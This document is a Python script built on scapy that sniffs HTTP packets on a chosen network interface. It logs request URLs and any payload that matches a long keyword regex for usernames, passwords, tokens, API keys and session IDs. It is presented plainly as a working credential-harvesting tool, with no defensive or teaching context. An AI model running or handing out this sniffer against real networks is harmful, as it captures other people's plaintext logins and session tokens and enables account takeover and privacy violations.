#!/usr/bin/env python
"""
Advanced network sniffer capturing HTTP packets on specified interfaces.
"""

import scapy.all as scapy
from scapy.layers import http
import logging
import re
import argparse
import json
import signal
import sys

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def parse_arguments():
    """
    Parse command line arguments.
    """
    parser = argparse.ArgumentParser(description='Advanced Network Packet Sniffer')
    parser.add_argument('--interface', type=str, help='Network interface to sniff on', required=True)
    return parser.parse_args()

def sniff(interface):
    """
    Sniff HTTP packets on a specified network interface.
    """
    try:
        scapy.sniff(iface=interface, store=False, prn=process_packet)
    except Exception as e:
        logging.error(f"Sniffing error: {e}")

def process_packet(packet):
    """
    Process each sniffed packet, extracting URLs and potential credentials.
    """
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        logging.info(f"Request URL: {url}")

        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load.decode(errors='ignore')
            check_for_credentials(payload)

def check_for_credentials(payload):
    """
    Check the payload for possible credentials.
    """
    keywords = r"(uname|usr|username|user|user_name|login|log|account|email|e-mail|pass|password|pwd|passwd|passcode|pin|auth|authentication|token|api_key|secret|session|sessionid|admin|root|access|entry|signin|signup|register)"
    if re.search(keywords, payload, re.IGNORECASE):
        logging.info(f"Possible credentials found: {payload}")

def signal_handler(sig, frame):
    """
    Handle interrupt signals for graceful shutdown.
    """
    logging.info('Interrupt received, shutting down...')
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    args = parse_arguments()
    sniff(args.interface)
